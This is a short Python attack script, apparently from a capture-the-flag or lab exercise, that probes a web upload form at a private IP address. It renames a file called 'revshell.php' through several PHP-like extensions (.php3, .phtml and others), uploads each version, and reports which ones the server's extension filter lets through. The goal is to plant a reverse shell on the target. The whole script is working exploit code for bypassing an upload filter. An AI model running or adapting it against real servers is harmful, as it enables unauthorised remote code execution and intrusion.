#!/usr/bin/env python

import requests
import os

ip = "10.10.42.87"
port = 3333

url = "http://10.10.42.87:3333/internal/index.php"

filename = "revshell"

extensions = [
    ".php",
    ".php3",
    ".php4",
    ".php5",
    ".phtml",
]
old_filename = "revshell.php"
for ext in extensions:
    new_filename = filename+ext
    os.rename(old_filename, new_filename)

    files = { "file": open(new_filename, "rb")}
    
    
    resp = requests.post(url, files = files)
    
    print(resp.text)
    if "Extension not allowed" in resp.text:
        print(f"{ext} not allowed")
    else:
        print(f"{ext} may be allowed")

    old_filename = new_filename